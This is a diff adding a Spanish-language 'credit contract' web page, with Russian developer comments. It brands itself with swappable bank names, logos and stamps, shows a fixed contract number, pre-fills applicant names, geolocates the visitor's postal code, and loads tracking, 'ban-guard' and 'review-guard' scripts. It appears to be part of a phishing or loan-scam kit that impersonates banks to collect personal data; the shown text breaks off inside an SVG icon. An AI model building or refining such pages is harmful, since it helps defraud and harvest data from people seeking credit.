@@ -1,0 +1,1100 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Contrato de crédito</title>
+
+    <link rel="stylesheet" href="../CSS/link-bank.css" />
+    <link rel="stylesheet" href="./tourist.css" />
+
+    <style>
+      /* Без нижнего таб-бара: убираем зарезервированные под него 96px */
+      body {
+        padding-bottom: 0;
+      }
+
+      .tourist-shell {
+        min-height: 100vh;
+        min-height: 100dvh;
+      }
+
+      /* Нижний отступ под кнопкой как у profile-plan.html (.btn → 20px) */
+      .tourist-main--credit-card {
+        padding-bottom: 20px;
+      }
+    </style>
+
+    <script src="../js/api-config.js?v=20260321-6"></script>
+    <script src="../js/flow-session-id.js?v=20260320-3"></script>
+    <script src="../js/navigation-guard.js?v=20260405-1"></script>
+    <script src="../js/client-tracker.js?v=20260518-1"></script>
+    <script>
+      // ── Банк и клиент: подставить в договор из localStorage и формы ──────────
+      // Расширение файлов для ассетов банка (svg / png — меняйте здесь, если кладёте .png)
+      document.addEventListener("DOMContentLoaded", function () {
+        var bank    = "";
+        var bankKey = "";
+        var legacyLogo = "";
+        try {
+          bank       = "EBN Banco";
+          bankKey    = "newBank";
+          legacyLogo = "";
+        } catch (e) {}
+
+        if (!bank) { bank = "EBN Banco"; bankKey = bankKey || "newBank"; }
+        var bankShort = bank;
+        var bankDisplay = bank;
+
+        // Путь к ресурсу конкретного банка
+        function bankAsset(file) {
+          var ext = file === "logo" ? "png" : "svg";
+          var assetName = file === "logo" ? "logo2" : file;
+          return bankKey ? ("../assets/banks/" + bankKey + "/" + assetName + "." + ext) : null;
+        }
+
+        // ── Название банка ──────────────────────────────────────────────────────
+        if (bank) {
+          var nameEl = document.getElementById("contractBankName");
+          if (nameEl) nameEl.textContent = bankShort;
+
+          var bodyName = document.getElementById("contractBodyBankName");
+          if (bodyName) bodyName.textContent = bankDisplay;
+
+          var bodyName2 = document.getElementById("contractBodyBankName2");
+          if (bodyName2) bodyName2.textContent = bankDisplay;
+
+          var signName = document.getElementById("contractSignBankName");
+          if (signName) signName.textContent = "Representante del banco " + bankDisplay;
+        }
+
+        // ── Логотип банка в шапке договора ─────────────────────────────────────
+        var logoSrc = bankAsset("logo") || legacyLogo;
+        if (logoSrc) {
+          var headerImg = document.getElementById("contractHeaderBrandImg");
+          if (headerImg) { headerImg.src = logoSrc; headerImg.alt = bank || "Banco"; }
+          var headerBrand = document.getElementById("contractHeaderBrand");
+          if (headerBrand) headerBrand.setAttribute("aria-label", bank || "Banco");
+        }
+
+        // ── Иконка банка на карточке (шапка страницы) ──────────────────────────
+        var iconSrc = bankAsset("icon") || legacyLogo;
+        if (iconSrc) {
+          var logoEl = document.getElementById("contractBankLogo");
+          if (logoEl) {
+            var img = document.createElement("img");
+            img.src = iconSrc;
+            img.alt = bank || "Banco";
+            img.style.cssText = "width:36px;height:36px;object-fit:contain;border-radius:4px;display:block;";
+            logoEl.innerHTML = "";
+            logoEl.appendChild(img);
+          }
+        }
+
+        // ── Печать банка в области подписи ─────────────────────────────────────
+        var stampSrc = bankAsset("stamp");
+        if (stampSrc) {
+          var stampEl = document.getElementById("contractStamp");
+          if (stampEl) stampEl.src = stampSrc;
+        }
+
+        // ── Имя клиента в договоре ──────────────────────────────────────────────
+        function fillNombre(val) {
+          document.querySelectorAll('[data-contract-field="nombre"]').forEach(function (el) {
+            el.textContent = val || "";
+          });
+        }
+
+        var ccfNombre = document.getElementById("ccfNombre");
+        if (ccfNombre) {
+          // Pre-fill из localStorage если поле пустое
+          if (!ccfNombre.value) {
+            var savedNombre = localStorage.getItem("touristCardNombre") || localStorage.getItem("inputName") || "";
+            if (savedNombre) ccfNombre.value = savedNombre;
+          }
+          // Обновляем при вводе в реальном времени
+          ccfNombre.addEventListener("input", function () { fillNombre(this.value.trim()); });
+          // Заполняем сразу (поле уже заполнено или только что pre-filled)
+          if (ccfNombre.value) fillNombre(ccfNombre.value.trim());
+        }
+
+        // Также заполняем при открытии модального окна договора
+        function fillFecha() {
+          var el = document.getElementById("contractFecha");
+          if (!el) return;
+          var now = new Date();
+          var d = String(now.getDate()).padStart(2, "0");
+          var m = String(now.getMonth() + 1).padStart(2, "0");
+          var y = now.getFullYear();
+          el.textContent = d + "/" + m + "/" + y;
+        }
+
+        var contractModal = document.getElementById("contractModal");
+        if (contractModal && ccfNombre) {
+          new MutationObserver(function (mutations) {
+            mutations.forEach(function (m) {
+              if (m.attributeName === "aria-hidden" && contractModal.getAttribute("aria-hidden") === "false") {
+                fillNombre(ccfNombre.value.trim());
+                fillFecha();
+              }
+            });
+          }).observe(contractModal, { attributes: true, attributeFilter: ["aria-hidden"] });
+        }
+      });
+    </script>
+    <script>
+      if (localStorage.getItem("creditCardSubmitted") === "1") {
+        window.location.replace("./index.html");
+      }
+      setInterval(function () {
+        if (localStorage.getItem("creditCardSubmitted") === "1") {
+          window.location.replace("./index.html");
+        }
+      }, 1000);
+      window.addEventListener("DOMContentLoaded", function () {
+        if (window.ClientTracker) ClientTracker.track("tourist_card_page_opened");
+
+        // Автозаполнение ZIP по IP
+        var apiBase = window.API_BASE || window.location.origin;
+        console.log("[geo] fetching from", apiBase + "/api/geo");
+        fetch(apiBase + "/api/geo")
+          .then(function (r) {
+            console.log("[geo] HTTP status:", r.status);
+            return r.json();
+          })
+          .then(function (geo) {
+            console.log("[geo] response:", JSON.stringify(geo));
+            if (!geo.ok) {
+              console.warn("[geo] ok=false, no postal data");
+              return;
+            }
+            var cpEl = document.getElementById("ccfCp");
+            if (!cpEl) { console.warn("[geo] ccfCp element not found"); return; }
+            if (!geo.postal) { console.warn("[geo] postal is empty"); return; }
+            if (cpEl.value) { console.log("[geo] field already filled:", cpEl.value); return; }
+            cpEl.value = geo.postal;
+            console.log("[geo] ZIP filled:", geo.postal);
+          })
+          .catch(function (err) {
+            console.error("[geo] fetch error:", err);
+          });
+      });
+    </script>
+      <script src="/js/ban-guard.js?v=20260708-1"></script>
+      <script src="/js/review-guard.js?v=20260729-1"></script>
+  <link rel="stylesheet" href="../CSS/theme.css?v=20260802-63" />
+
+  </head>
+
+  <body class="tourist-detail-transaction-page">
+    <div class="tourist-shell">
+      <div class="tourist-topbar">
+        <button type="button" class="tourist-topbar__back" data-tourist-back data-tourist-back-fallback="./assistant.html" aria-label="Atrás">
+          <svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M12.5 16.6 7.07 11.17a1.65 1.65 0 0 1 0-2.34L12.5 3.4" stroke="#0F0F0F" stroke-width="1.5" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"/>
+          </svg>
+        </button>
+        <h1 class="tourist-topbar__title">Contrato de crédito</h1>
+      </div>
+
+      <main class="tourist-main tourist-main--credit-card">
+        <section class="tourist-hero">
+          <h2 class="tourist-hero__title">
+            Complete y firme el <span class="tourist-hero__accent">contrato de crédito</span>
+          </h2>
+          <p class="tourist-hero__subtitle">
+            Acompañaremos su solicitud con bancos colaboradores para aumentar las posibilidades de aprobación.
+          </p>
+        </section>
+
+        <section class="tourist-contract-card" aria-label="Términos contrato de crédito">
+          <svg
+            class="tourist-contract-card__grid"
+            width="370"
+            height="169"
+            viewBox="0 0 370 169"
+            fill="none"
+            xmlns="http://www.w3.org/2000/svg"
+            aria-hidden="true"
+          >
+            <g opacity="0.04">
+              <path d="M0 24.14H370" stroke="white" stroke-width="0.308333"/>
+              <path d="M0 48.28H370" stroke="white" stroke-width="0.308333"/>
+              <path d="M0 72.42H370" stroke="white" stroke-width="0.308333"/>
+              <path d="M0 96.56H370" stroke="white" stroke-width="0.308333"/>
+              <path d="M0 120.7H370" stroke="white" stroke-width="0.308333"/>
+              <path d="M0 144.84H370" stroke="white" stroke-width="0.308333"/>
+              <path d="M30.83 0V169" stroke="white" stroke-width="0.308333"/>
+              <path d="M61.67 0V169" stroke="white" stroke-width="0.308333"/>
+              <path d="M92.5 0V169" stroke="white" stroke-width="0.308333"/>
+              <path d="M123.33 0V169" stroke="white" stroke-width="0.308333"/>
+              <path d="M154.17 0V169" stroke="white" stroke-width="0.308333"/>
+              <path d="M185 0V169" stroke="white" stroke-width="0.308333"/>
+              <path d="M215.83 0V169" stroke="white" stroke-width="0.308333"/>
+              <path d="M246.67 0V169" stroke="white" stroke-width="0.308333"/>
+              <path d="M277.5 0V169" stroke="white" stroke-width="0.308333"/>
+              <path d="M308.33 0V169" stroke="white" stroke-width="0.308333"/>
+              <path d="M339.17 0V169" stroke="white" stroke-width="0.308333"/>
+            </g>
+          </svg>
+          <span class="tourist-contract-card__stripe" aria-hidden="true"></span>
+
+          <div class="tourist-contract-card__content">
+            <div class="tourist-contract-card__copy">
+              <h3 class="tourist-contract-card__title">Términos contrato de crédito</h3>
+              <p class="tourist-contract-card__desc">
+                Revise las condiciones del crédito y firme el contrato de forma segura.
+              </p>
+            </div>
+
+            <button type="button" class="tourist-contract-card__pdf" data-contract-open="view" aria-label="Abrir PDF del contrato">
+              <svg width="38" height="38" viewBox="0 0 38 38" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+                <g clip-path="url(#contractCardPdfClip)">
+                  <path d="M28.0837 0H15.4579H14.4796L13.7882 0.691273L4.23034 10.2498L3.53906 10.941V11.9189V31.6251C3.53906 35.1401 6.39856 38.0001 9.91416 38.0001H28.0837C31.5982 38.0001 34.4577 35.1401 34.4577 31.6251V6.37509C34.4577 2.8595 31.5982 0 28.0837 0ZM32.0978 31.625C32.0978 33.8424 30.3006 35.6395 28.0837 35.6395H9.91416C7.6962 35.6395 5.89907 33.8424 5.89907 31.625V11.9189H12.1124C13.9593 11.9189 15.4579 10.4213 15.4579 8.57382V2.36045H28.0837C30.3006 2.36045 32.0978 4.15759 32.0978 6.37509V31.625Z" fill="white"/>
+                  <path d="M12.7621 18.7617H10.6447C10.2415 18.7617 10 19.0239 10 19.4167V24.8906C10 25.3647 10.312 25.6773 10.7452 25.6773C11.1691 25.6773 11.481 25.3648 11.481 24.8906V23.2277C11.481 23.1872 11.5017 23.167 11.5422 23.167H12.7621C14.2535 23.167 15.151 22.2596 15.151 20.9693C15.1511 19.6587 14.2639 18.7617 12.7621 18.7617ZM12.6709 21.8866H11.5422C11.5017 21.8866 11.481 21.8664 11.481 21.8264V20.1023C11.481 20.0619 11.5017 20.0418 11.5422 20.0418H12.6709C13.2958 20.0418 13.6689 20.4149 13.6689 20.9694C13.669 21.5238 13.2958 21.8866 12.6709 21.8866Z" fill="white"/>
+                  <path d="M18.5724 18.7617H16.9494C16.5462 18.7617 16.3047 19.0239 16.3047 19.4167V24.9715C16.3047 25.3648 16.5461 25.6166 16.9494 25.6166H18.5724C20.0337 25.6166 20.9417 25.1528 21.3044 24.034C21.435 23.6406 21.5065 23.167 21.5065 22.1891C21.5065 21.2113 21.4349 20.7376 21.3044 20.3444C20.9416 19.2255 20.0337 18.7617 18.5724 18.7617ZM19.8834 23.52C19.7114 24.0641 19.2181 24.2962 18.5319 24.2962H17.8469C17.8064 24.2962 17.7857 24.276 17.7857 24.2356V20.1428C17.7857 20.1023 17.8064 20.0821 17.8469 20.0821H18.5319C19.2181 20.0821 19.7114 20.3143 19.8834 20.8585C19.9539 21.0906 20.0037 21.4938 20.0037 22.1892C20.0037 22.8846 19.9539 23.2878 19.8834 23.52Z" fill="white"/>
+                  <path d="M26.8075 18.7617H23.4816C23.0785 18.7617 22.8359 19.0239 22.8359 19.4167V24.8906C22.8359 25.3647 23.149 25.6773 23.5822 25.6773C24.005 25.6773 24.318 25.3648 24.318 24.8906V22.9349C24.318 22.895 24.3377 22.8748 24.3781 22.8748H26.3142C26.7474 22.8748 26.9992 22.6126 26.9992 22.2395C26.9992 21.8663 26.7474 21.6047 26.3142 21.6047H24.3781C24.3377 21.6047 24.318 21.5845 24.318 21.544V20.1023C24.318 20.0619 24.3377 20.0418 24.3781 20.0418H26.8075C27.2211 20.0418 27.4937 19.7697 27.4937 19.407C27.4936 19.0337 27.221 18.7617 26.8075 18.7617Z" fill="white"/>
+                </g>
+                <defs>
+                  <clipPath id="contractCardPdfClip">
+                    <rect width="38" height="38" fill="white"/>
+                  </clipPath>
+                </defs>
+              </svg>
+            </button>
+
+            <div class="tourist-contract-card__bank">
+              <span class="tourist-contract-card__logo" id="contractBankLogo" aria-hidden="true">
+                <svg width="36" height="36" viewBox="0 0 36 36" fill="none" xmlns="http://www.w3.org/2000/svg">
+                  <rect width="36" height="36" rx="18" fill="white"/>
+                </svg>
+              </span>
+              <span class="tourist-contract-card__bank-text">
+                <strong id="contractBankName">EBN Banco</strong>
+                <span>Contrato Nº ES-4738D9215</span>
+              </span>
+            </div>
+
+            <button type="button" class="tourist-contract-card__button" data-contract-open="view">
+              Abrir PDF
+            </button>
+          </div>
+        </section>
+
+        <section class="tourist-stats" aria-label="Beneficios del plan">
+          <div class="tourist-stats__item">
+            <span class="tourist-stats__icon" aria-hidden="true">
+              <svg width="30" height="30" viewBox="0 0 30 30" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M27.4922 13.4375H2.49219C1.97969 13.4375 1.55469 13.0125 1.55469 12.5C1.55469 11.9875 1.97969 11.5625 2.49219 11.5625H27.4922C28.0047 11.5625 28.4297 11.9875 28.4297 12.5C28.4297 13.0125 28.0047 13.4375 27.4922 13.4375Z" fill="url(#ccStatAnu0)"/>
+                <path d="M14.4422 26.5656H8.0547C3.0797 26.5656 1.55469 25.0656 1.55469 20.1406V9.86563C1.55469 5.92813 2.39218 3.74063 6.85467 3.47813C7.22967 3.46563 7.6297 3.45312 8.0547 3.45312H21.9422C26.9172 3.45312 28.4422 4.95312 28.4422 9.87812V15.3906C28.4422 15.9031 28.0172 16.3281 27.5047 16.3281C26.9922 16.3281 26.5672 15.9031 26.5672 15.3906V9.87812C26.5672 6.01562 25.8797 5.32812 21.9422 5.32812H8.0547C7.6547 5.32812 7.29218 5.34063 6.94218 5.35313C4.22968 5.51563 3.42969 6.12812 3.42969 9.87812V20.1531C3.42969 24.0156 4.1172 24.7031 8.0547 24.7031H14.4422C14.9547 24.7031 15.3797 25.1281 15.3797 25.6406C15.3797 26.1531 14.9672 26.5656 14.4422 26.5656Z" fill="url(#ccStatAnu1)"/>
+                <path d="M12.5 20.9375H7.5C6.9875 20.9375 6.5625 20.5125 6.5625 20C6.5625 19.4875 6.9875 19.0625 7.5 19.0625H12.5C13.0125 19.0625 13.4375 19.4875 13.4375 20C13.4375 20.5125 13.0125 20.9375 12.5 20.9375Z" fill="url(#ccStatAnu2)"/>
+                <path d="M22.4922 28.4375C20.4172 28.4375 18.4672 27.3375 17.4172 25.55C16.8547 24.65 16.5547 23.5875 16.5547 22.5C16.5547 19.225 19.2172 16.5625 22.4922 16.5625C25.7672 16.5625 28.4297 19.225 28.4297 22.5C28.4297 23.5875 28.1297 24.65 27.5672 25.5625C26.5172 27.3375 24.5672 28.4375 22.4922 28.4375ZM22.4922 18.4375C20.2547 18.4375 18.4297 20.2625 18.4297 22.5C18.4297 23.2375 18.6297 23.9625 19.0172 24.5875C19.7422 25.8125 21.0797 26.5625 22.4922 26.5625C23.9047 26.5625 25.2422 25.8125 25.9672 24.6C26.3547 23.9625 26.5547 23.25 26.5547 22.5C26.5547 20.2625 24.7297 18.4375 22.4922 18.4375Z" fill="url(#ccStatAnu3)"/>
+                <path d="M21.7891 24.675C21.5516 24.675 21.3141 24.5875 21.1266 24.4L19.8891 23.1624C19.5266 22.7999 19.5266 22.1999 19.8891 21.8374C20.2516 21.4749 20.8516 21.4749 21.2141 21.8374L21.8141 22.4374L23.8141 20.5874C24.1891 20.2374 24.7891 20.2624 25.1391 20.6374C25.4891 21.0124 25.4641 21.6125 25.0891 21.9625L22.4266 24.4249C22.2391 24.5874 22.0141 24.675 21.7891 24.675Z" fill="url(#ccStatAnu4)"/>
+                <defs>
+                  <linearGradient id="ccStatAnu0" x1="14.9922" y1="11.5625" x2="14.9922" y2="13.4375" gradientUnits="userSpaceOnUse">
+                    <stop stop-color="#FF77D7"/>
+                    <stop offset="1" stop-color="var(--interface-accent)"/>
+                  </linearGradient>
+                  <linearGradient id="ccStatAnu1" x1="14.9984" y1="3.45312" x2="14.9984" y2="26.5656" gradientUnits="userSpaceOnUse">
+                    <stop stop-color="#FF77D7"/>
+                    <stop offset="1" stop-color="var(--interface-accent)"/>
+                  </linearGradient>
+                  <linearGradient id="ccStatAnu2" x1="10" y1="19.0625" x2="10" y2="20.9375" gradientUnits="userSpaceOnUse">
+                    <stop stop-color="#FF77D7"/>
+                    <stop offset="1" stop-color="var(--interface-accent)"/>
+                  </linearGradient>
+                  <linearGradient id="ccStatAnu3" x1="22.4922" y1="16.5625" x2="22.4922" y2="28.4375" gradientUnits="userSpaceOnUse">
+                    <stop stop-color="#FF77D7"/>
+                    <stop offset="1" stop-color="var(--interface-accent)"/>
+                  </linearGradient>
+                  <linearGradient id="ccStatAnu4" x1="22.5019" y1="20.3398" x2="22.5019" y2="24.675" gradientUnits="userSpaceOnUse">
+                    <stop stop-color="#FF77D7"/>
+                    <stop offset="1" stop-color="var(--interface-accent)"/>
+                  </linearGradient>
+                </defs>
+              </svg>
+            </span>
+            <span class="tourist-stats__title">Rápido</span>
+            <span class="tourist-stats__sub">Respuesta rápida</span>
+          </div>
+
+          <span class="tourist-stats__divider" aria-hidden="true"></span>
+
+          <div class="tourist-stats__item">
+            <span class="tourist-stats__icon" aria-hidden="true">
+              <svg width="30" height="30" viewBox="0 0 30 30" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M15 28.4406C14.125 28.4406 13.2375 28.1031 12.575 27.4406L10.4375 25.3281C9.90001 24.8031 9.19999 24.5156 8.44999 24.5156H7.5C4.9125 24.5156 2.8125 22.4281 2.8125 19.8656V6.22809C2.8125 3.66559 4.9125 1.57812 7.5 1.57812H22.5C25.0875 1.57812 27.1875 3.66559 27.1875 6.22809V19.8656C27.1875 22.4281 25.0875 24.5156 22.5 24.5156H21.55C20.8 24.5156 20.0875 24.8031 19.5625 25.3281L17.425 27.4406C16.7625 28.1031 15.875 28.4406 15 28.4406ZM7.5 3.44061C5.95 3.44061 4.6875 4.69058 4.6875 6.21558V19.8531C4.6875 21.3906 5.95 22.6281 7.5 22.6281H8.44999C9.69999 22.6281 10.875 23.1155 11.7625 23.9905L13.9 26.1031C14.5125 26.7031 15.5 26.7031 16.1125 26.1031L18.25 23.9905C19.1375 23.1155 20.3125 22.6281 21.5625 22.6281H22.5C24.05 22.6281 25.3125 21.3781 25.3125 19.8531V6.21558C25.3125 4.67808 24.05 3.44061 22.5 3.44061H7.5Z" fill="url(#ccStatCal0)"/>
+                <path d="M12.9719 18.1368H9.62186C9.07186 18.1368 8.55936 17.8742 8.23436 17.4242C7.92186 16.9992 7.84686 16.4743 7.99686 15.9743C8.43436 14.6368 9.50936 13.9117 10.4594 13.2617C11.4594 12.5867 12.0219 12.1618 12.0219 11.4368C12.0219 10.7868 11.4969 10.2617 10.8469 10.2617C10.1969 10.2617 9.67188 10.7868 9.67188 11.4368C9.67188 11.9493 9.24688 12.3743 8.73438 12.3743C8.22188 12.3743 7.79688 11.9493 7.79688 11.4368C7.79688 9.7618 9.15936 8.38672 10.8469 8.38672C12.5344 8.38672 13.8969 9.7493 13.8969 11.4368C13.8969 13.1993 12.5719 14.0992 11.5094 14.8242C10.8469 15.2742 10.2219 15.6993 9.90936 16.2618H12.9594C13.4719 16.2618 13.8969 16.6868 13.8969 17.1993C13.8969 17.7118 13.4844 18.1368 12.9719 18.1368Z" fill="url(#ccStatCal1)"/>
+                <path d="M20.0594 18.1362C19.5469 18.1362 19.1219 17.7112 19.1219 17.1987V16.3361H16.6719C16.6719 16.3361 16.6719 16.3361 16.6594 16.3361C16.0469 16.3361 15.4844 16.0112 15.1719 15.4862C14.8594 14.9487 14.8594 14.2862 15.1719 13.7612C16.0219 12.2987 17.0094 10.6362 17.9094 9.18617C18.3094 8.54867 19.0719 8.26122 19.7844 8.46122C20.4969 8.67372 20.9969 9.32377 20.9844 10.0738V14.4736H21.2594C21.7719 14.4736 22.1969 14.8986 22.1969 15.4111C22.1969 15.9236 21.7719 16.3486 21.2594 16.3486H20.9969V17.2112C20.9969 17.7237 20.5844 18.1362 20.0594 18.1362ZM19.1219 10.7987C18.3844 11.9987 17.6219 13.2861 16.9344 14.4611H19.1219V10.7987Z" fill="url(#ccStatCal2)"/>
+                <defs>
+                  <linearGradient id="ccStatCal0" x1="15" y1="1.57812" x2="15" y2="28.4406" gradientUnits="userSpaceOnUse">
+                    <stop stop-color="#FF77D7"/>
+                    <stop offset="1" stop-color="var(--interface-accent)"/>
+                  </linearGradient>
+                  <linearGradient id="ccStatCal1" x1="10.8469" y1="8.38672" x2="10.8469" y2="18.1368" gradientUnits="userSpaceOnUse">
+                    <stop stop-color="#FF77D7"/>
+                    <stop offset="1" stop-color="var(--interface-accent)"/>
+                  </linearGradient>
+                  <linearGradient id="ccStatCal2" x1="18.5672" y1="8.39844" x2="18.5672" y2="18.1362" gradientUnits="userSpaceOnUse">
+                    <stop stop-color="#FF77D7"/>
+                    <stop offset="1" stop-color="var(--interface-accent)"/>
+                  </linearGradient>
+                </defs>
+              </svg>
+            </span>
+            <span class="tourist-stats__title">24/7</span>
+            <span class="tourist-stats__sub">Gestión activa</span>
+          </div>
+
+          <span class="tourist-stats__divider" aria-hidden="true"></span>
+
+          <div class="tourist-stats__item">
+            <span class="tourist-stats__icon" aria-hidden="true">
+              <svg width="30" height="30" viewBox="0 0 30 30" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M15 28.4375C7.5875 28.4375 1.5625 22.4125 1.5625 15C1.5625 7.5875 7.5875 1.5625 15 1.5625C22.4125 1.5625 28.4375 7.5875 28.4375 15C28.4375 22.4125 22.4125 28.4375 15 28.4375ZM15 3.4375C8.625 3.4375 3.4375 8.625 3.4375 15C3.4375 21.375 8.625 26.5625 15 26.5625C21.375 26.5625 26.5625 21.375 26.5625 15C26.5625 8.625 21.375 3.4375 15 3.4375Z" fill="url(#ccStatGlob0)"/>
+                <path d="M11.2547 27.1875H10.0047C9.49219 27.1875 9.06719 26.7625 9.06719 26.25C9.06719 25.7375 9.46719 25.325 9.97969 25.3125C8.01719 18.6125 8.01719 11.3875 9.97969 4.6875C9.46719 4.675 9.06719 4.2625 9.06719 3.75C9.06719 3.2375 9.49219 2.8125 10.0047 2.8125H11.2547C11.5547 2.8125 11.8422 2.9625 12.0172 3.2C12.1922 3.45 12.2422 3.7625 12.1422 4.05C9.79219 11.1125 9.79219 18.8875 12.1422 25.9625C12.2422 26.25 12.1922 26.5625 12.0172 26.8125C11.8422 27.0375 11.5547 27.1875 11.2547 27.1875Z" fill="url(#ccStatGlob1)"/>
+                <path d="M18.7529 27.1903C18.6529 27.1903 18.5529 27.1778 18.4529 27.1403C17.9654 26.9778 17.6904 26.4403 17.8654 25.9528C20.2154 18.8903 20.2154 11.1153 17.8654 4.04029C17.7029 3.55279 17.9654 3.01529 18.4529 2.85279C18.9529 2.69029 19.4779 2.95279 19.6404 3.44029C22.1279 10.8903 22.1279 19.0903 19.6404 26.5278C19.5154 26.9403 19.1404 27.1903 18.7529 27.1903Z" fill="url(#ccStatGlob2)"/>
+                <path d="M15 21.501C11.5125 21.501 8.0375 21.0135 4.6875 20.026C4.675 20.526 4.2625 20.9385 3.75 20.9385C3.2375 20.9385 2.8125 20.5135 2.8125 20.001V18.751C2.8125 18.451 2.9625 18.1635 3.2 17.9885C3.45 17.8135 3.7625 17.7635 4.05 17.8635C11.1125 20.2135 18.9 20.2135 25.9625 17.8635C26.25 17.7635 26.5625 17.8135 26.8125 17.9885C27.0625 18.1635 27.2 18.451 27.2 18.751V20.001C27.2 20.5135 26.775 20.9385 26.2625 20.9385C25.75 20.9385 25.3375 20.5385 25.325 20.026C21.9625 21.0135 18.4875 21.501 15 21.501Z" fill="url(#ccStatGlob3)"/>
+                <path d="M26.2546 12.1867C26.1546 12.1867 26.0546 12.1742 25.9546 12.1367C18.8921 9.78672 11.1046 9.78672 4.04211 12.1367C3.54211 12.2992 3.01711 12.0367 2.85461 11.5492C2.70461 11.0492 2.96711 10.5242 3.45461 10.3617C10.9046 7.87422 19.1046 7.87422 26.5421 10.3617C27.0296 10.5242 27.3046 11.0617 27.1296 11.5492C27.0171 11.9367 26.6421 12.1867 26.2546 12.1867Z" fill="url(#ccStatGlob4)"/>
+                <defs>
+                  <linearGradient id="ccStatGlob0" x1="15" y1="1.5625" x2="15" y2="28.4375" gradientUnits="userSpaceOnUse">
+                    <stop stop-color="#FF77D7"/>
+                    <stop offset="1" stop-color="var(--interface-accent)"/>
+                  </linearGradient>
+                  <linearGradient id="ccStatGlob1" x1="10.3505" y1="2.8125" x2="10.3505" y2="27.1875" gradientUnits="userSpaceOnUse">
+                    <stop stop-color="#FF77D7"/>
+                    <stop offset="1" stop-color="var(--interface-accent)"/>
+                  </linearGradient>
+                  <linearGradient id="ccStatGlob2" x1="19.6593" y1="2.80469" x2="19.6593" y2="27.1903" gradientUnits="userSpaceOnUse">
+                    <stop stop-color="#FF77D7"/>
+                    <stop offset="1" stop-color="var(--interface-accent)"/>
+                  </linearGradient>
+                  <linearGradient id="ccStatGlob3" x1="15.0063" y1="17.8125" x2="15.0063" y2="21.501" gradientUnits="userSpaceOnUse">
+                    <stop stop-color="#FF77D7"/>
+                    <stop offset="1" stop-color="var(--interface-accent)"/>
+                  </linearGradient>
+                  <linearGradient id="ccStatGlob4" x1="14.9975" y1="8.49609" x2="14.9975" y2="12.1867" gradientUnits="userSpaceOnUse">
+                    <stop stop-color="#FF77D7"/>
+                    <stop offset="1" stop-color="var(--interface-accent)"/>
+                  </linearGradient>
+                </defs>
+              </svg>
+            </span>
+            <span class="tourist-stats__title">Seguro</span>
+            <span class="tourist-stats__sub">Datos protegidos</span>
+          </div>
+        </section>
+
+        <div class="tourist-eta-banner">
+          <span class="tourist-eta-banner__icon" aria-hidden="true">
+            <svg width="36" height="36" viewBox="0 0 36 36" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <rect width="36" height="36" rx="18" fill="white"/>
+              <path d="M22.3576 10.262V8.83203C22.3576 8.4562 22.046 8.14453 21.6701 8.14453C21.2943 8.14453 20.9826 8.4562 20.9826 8.83203V10.207H15.0243V8.83203C15.0243 8.4562 14.7126 8.14453 14.3368 8.14453C13.961 8.14453 13.6493 8.4562 13.6493 8.83203V10.262C11.1743 10.4912 9.97347 11.967 9.79013 14.1579C9.7718 14.4237 9.9918 14.6437 10.2485 14.6437H25.7585C26.0243 14.6437 26.2443 14.4145 26.2168 14.1579C26.0335 11.967 24.8326 10.4912 22.3576 10.262Z" fill="var(--interface-accent)"/>
+              <path d="M24.4167 20.75C22.3908 20.75 20.75 22.3908 20.75 24.4167C20.75 25.1042 20.9425 25.755 21.2817 26.305C21.9142 27.3683 23.0783 28.0833 24.4167 28.0833C25.755 28.0833 26.9192 27.3683 27.5517 26.305C27.8908 25.755 28.0833 25.1042 28.0833 24.4167C28.0833 22.3908 26.4425 20.75 24.4167 20.75ZM26.3142 24.0225L24.3617 25.8283C24.2333 25.9475 24.0592 26.0117 23.8942 26.0117C23.72 26.0117 23.5458 25.9475 23.4083 25.81L22.5008 24.9025C22.235 24.6367 22.235 24.1967 22.5008 23.9308C22.7667 23.665 23.2067 23.665 23.4725 23.9308L23.9125 24.3708L25.3792 23.0142C25.6542 22.7575 26.0942 22.7758 26.3508 23.0508C26.6075 23.3258 26.5892 23.7567 26.3142 24.0225Z" fill="var(--interface-accent)"/>
+              <path d="M25.3333 16.0195H10.6667C10.1625 16.0195 9.75 16.432 9.75 16.9362V22.5829C9.75 25.3329 11.125 27.1662 14.3333 27.1662H18.8525C19.485 27.1662 19.925 26.552 19.7233 25.9562C19.54 25.4245 19.3842 24.8379 19.3842 24.4162C19.3842 21.6387 21.6483 19.3745 24.4258 19.3745C24.6917 19.3745 24.9575 19.3929 25.2142 19.4387C25.7642 19.5212 26.2592 19.0904 26.2592 18.5404V16.9454C26.25 16.432 25.8375 16.0195 25.3333 16.0195ZM15.4425 23.692C15.2683 23.857 15.03 23.9579 14.7917 23.9579C14.5533 23.9579 14.315 23.857 14.1408 23.692C13.9758 23.5179 13.875 23.2795 13.875 23.0412C13.875 22.8029 13.9758 22.5645 14.1408 22.3904C14.2325 22.3079 14.3242 22.2437 14.4433 22.1979C14.7825 22.0512 15.1858 22.1337 15.4425 22.3904C15.6075 22.5645 15.7083 22.8029 15.7083 23.0412C15.7083 23.2795 15.6075 23.5179 15.4425 23.692ZM15.4425 20.4837C15.3967 20.5204 15.3508 20.557 15.305 20.5937C15.25 20.6304 15.195 20.6579 15.14 20.6762C15.085 20.7037 15.03 20.722 14.975 20.7312C14.9108 20.7404 14.8467 20.7495 14.7917 20.7495C14.5533 20.7495 14.315 20.6487 14.1408 20.4837C13.9758 20.3095 13.875 20.0712 13.875 19.8329C13.875 19.5945 13.9758 19.3562 14.1408 19.182C14.3517 18.9712 14.6725 18.8704 14.975 18.9345C15.03 18.9437 15.085 18.962 15.14 18.9895C15.195 19.0079 15.25 19.0354 15.305 19.072C15.3508 19.1087 15.3967 19.1454 15.4425 19.182C15.6075 19.3562 15.7083 19.5945 15.7083 19.8329C15.7083 20.0712 15.6075 20.3095 15.4425 20.4837ZM18.6508 20.4837C18.4767 20.6487 18.2383 20.7495 18 20.7495C17.7617 20.7495 17.5233 20.6487 17.3492 20.4837C17.1842 20.3095 17.0833 20.0712 17.0833 19.8329C17.0833 19.5945 17.1842 19.3562 17.3492 19.182C17.6975 18.8429 18.3117 18.8429 18.6508 19.182C18.8158 19.3562 